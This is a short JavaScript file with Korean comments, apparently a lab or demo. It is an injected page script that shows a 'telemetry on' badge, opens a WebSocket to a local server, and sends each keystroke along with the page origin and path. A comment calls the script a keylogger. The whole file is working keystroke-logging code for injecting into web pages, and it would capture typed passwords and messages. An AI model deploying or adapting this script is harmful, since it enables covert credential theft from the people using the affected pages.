//즉시실행 함수임
(() => {
  console.log("[injected] loaded from :4000");

  //그냥 문구 6초동안 뜨게 만든 div태그 입니다.
  const badge = document.createElement("div");
  badge.textContent = "Injected script (telemetry on)";
  badge.style.cssText = `
    position: fixed;
    left: 16px;
    bottom: 16px;
    z-index: 999999;
    padding: 10px 12px;
    border-radius: 10px;
    background: #111;
    color: #fff;
    font-size: 13px;
    font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
  `;
  document.documentElement.appendChild(badge);

  //세션이랑 웹소켓 생성
  const sessionId = (crypto.randomUUID && crypto.randomUUID()) || String(Math.random()).slice(2);//통신하기 전에 세션 만들기
  const ws = new WebSocket("ws://localhost:5000");//5000번 서버와 연결하는 웹소켓 객체 생성

  function safeSend(obj) {
    if (ws.readyState !== WebSocket.OPEN) return;//웹소켓 준비 안됐으면 종료
    ws.send(JSON.stringify(obj));//자바스크립트 객체를 문자열 데이터로 변환해서 보냄
  }

  //웹소켓이 열렸을 때, 어느 origin에 주입 됐는지를 알림
  ws.addEventListener("open", () => {
    safeSend({
      eventType: "INJECTED_LOADED",
      ts: Date.now(),
      sessionId,
      pageOrigin: location.origin,
      pagePath: location.pathname
    });

    //키로거로 수정
    document.addEventListener("keydown", (e) => {
      safeSend({
        eventType: "KEY_LOG",
        ts: Date.now(),
        sessionId,
        key: e.key,
        pageOrigin: location.origin,
        pagePath: location.pathname
      });
    });
  });

  ws.addEventListener("error", () => console.log("[injected] ws error"));//에러 알림
  ws.addEventListener("close", () => console.log("[injected] ws closed"));//종료 알림

  setTimeout(() => badge.remove(), 6000);//6초 뒤에 자동으로 꺼짐
})();
